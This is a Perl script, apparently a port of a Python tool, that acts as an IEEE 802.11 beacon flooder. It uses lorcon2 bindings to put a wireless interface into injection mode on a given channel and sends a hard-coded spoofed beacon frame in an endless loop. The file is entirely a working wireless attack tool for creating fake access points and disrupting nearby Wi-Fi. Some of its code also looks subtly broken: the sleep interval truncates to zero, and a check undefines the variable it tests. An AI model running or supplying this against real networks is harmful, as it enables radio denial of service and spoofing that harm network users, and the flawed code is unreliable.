#!/usr/bin/perl

# Made by Edoardo Mantovani, 2020

# perl translation for "beacon_flood_raw.py"

# beacon_flood_raw.pl - Simple IEEE 802.11
#	beacon flooder using Air::Lorcon2 raw
#	sending capabilities.


use strict;
use warnings;
use Air::Legacy qw( :lorcon ); # import lorcon2 utilities

my $driver = shift or die "./beacon_flood_raw.pl <driver> <interface> <channel>\n";
my $interface = shift or die "./beacon_flood_raw.pl <driver> <interface> <channel>\n";
my $channel = shift or die "./beacon_flood_raw.pl <driver> <interface> <channel>\n";

# consider $lorcon like context on Lorcon2

sub usage() {
	print $0," - Simple 802.11 beacon flooder";
	print "-----------------------------------------------------\n" ;
	my $interval = 100;
	my $packet = "\x80\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x0f\x66\xe3\xe4\x03\x00\x0f\x66\xe3\xe4\x03\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x64\x00\x11\x00\x00\x0f\x73\x6f\x6d\x65\x74\x68\x69\x6e\x67\x63\x6c\x65\x76\x65\x72\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c\x03\x01\x01\x05\x04\x00\x01\x00\x00\x2a\x01\x05\x2f\x01\x05\x32\x04\x0c\x12\x18\x60\xdd\x05\x00\x10\x18\x01\x01\xdd\x16\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x01\x00\x00\x50\xf2\x02\x01\x00\x00\x50\xf2\x02";

		my $drv = lorcon_find_driver( $driver ) or die $!;
		my $lorcon = lorcon_create( $interface, $driver ) or die $!;
		lorcon_open_injmon( $lorcon ) or die lorcon_get_error( $lorcon );
		my $vap = lorcon_get_vap( $lorcon ) or die lorcon_get_error( $lorcon );
		if(! undef( $vap ) ){
			print "[+]\t Monitor mode VAP: $vap\n";
			}

		# set the channel to inject
		lorcon_set_channel( $channel ) or die lorcon_get_error( $lorcon );
		sleep(1);
		print "using CHANNEL:  $channel\n"; 
		# flooding part
		my $sliptime = int( $interval / 1000 );
		while(1){
			lorcon_send_bytes( $lorcon, length( $packet ), $packet ) or die lorcon_get_error( $lorcon );
			sleep( $sliptime );
		
			}
		lorcon_close( $lorcon ) or die $!;
}

&usage();
